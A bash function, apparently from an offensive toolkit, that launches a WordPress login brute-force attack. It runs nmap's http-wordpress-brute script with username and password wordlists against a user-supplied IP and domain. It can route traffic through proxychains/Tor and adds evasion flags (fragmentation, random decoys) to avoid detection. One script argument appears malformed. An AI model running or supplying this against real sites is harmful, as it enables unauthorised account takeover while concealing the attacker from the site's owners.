#! /bin/bash

source ./assets/set_color.sh

source ./pkg/inputs/inputs.sh
source ./pkg/settings/services.sh
source ./pkg/settings/create_dir.sh
source ./pkg/outputs/success_output.sh
source ./pkg/validators/ipv4_validator.sh


function wordpress_attack()
{
  services "Wordpress attack"

  proxychains_input
  if [[ $proxychains == [Yy] ]]; then
    is_tor="proxychains4"
  else
    is_tor=""
  fi

  dns_input
  if ! ipv4_validator "$dns"; then
    return 1
  fi

  domain_input

  debug_mode
  if [[ $debug == [Yy] ]]; then
    debug_flag="-d"
  else
    debug_flag=""
  fi

  dir_input
  create_dir "$dir_name/attacks/wordpress"

  $is_tor nmap -sV -p"$ports" --script=http-wordpress-brute \
    --script-args="userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.$domain,http-wordpress-brute.threads=3,brute.firstonly=true" \
    -f --send-eth -D RND:3 \
    "$debug_flag" -oN "$HOME/$dir_name/attacks/wordpress/$dns.nmap" "$dns"

  success_output "$HOME/$dir_name/attacks/wordpress/$dns.nmap"
}
